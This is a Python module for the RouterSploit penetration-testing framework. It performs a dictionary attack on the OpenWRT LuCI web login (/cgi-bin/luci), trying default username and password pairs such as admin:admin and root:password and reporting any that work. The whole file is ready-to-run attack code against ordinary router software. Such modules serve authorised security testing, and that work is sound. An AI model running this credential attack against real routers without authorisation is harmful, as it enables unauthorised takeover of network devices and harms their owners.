from routersploit.core.exploit import *
from routersploit.modules.creds.generic.http_basic_post_default import Exploit as HTTPBasicPostDefault


class Exploit(HTTPBasicPostDefault):
    __info__ = {
        "name": "OpenWRT Router Default Web Interface Creds - HTTP Auth",
        "description": "Module performs dictionary attack against OpenWRT Router web interface. "
                       "If valid credentials are found, they are displayed to the user.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
            "Kaz Bishop <evillogic1[at]gmail.com>", # this module
        ),
        "devices": (
            "OpenWRT Router",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(80, "Target HTTP port")
    path = OptString("/cgi-bin/luci", "Target path")

    username_field = OptString("luci_username", "Target username field")
    password_field = OptString("luci_password", "Target password field")

    threads = OptInteger(1, "Number of threads")
    defaults = OptWordlist("admin:admin,admin:password,root:password", "User:Pass or file with default credentials (file://)")
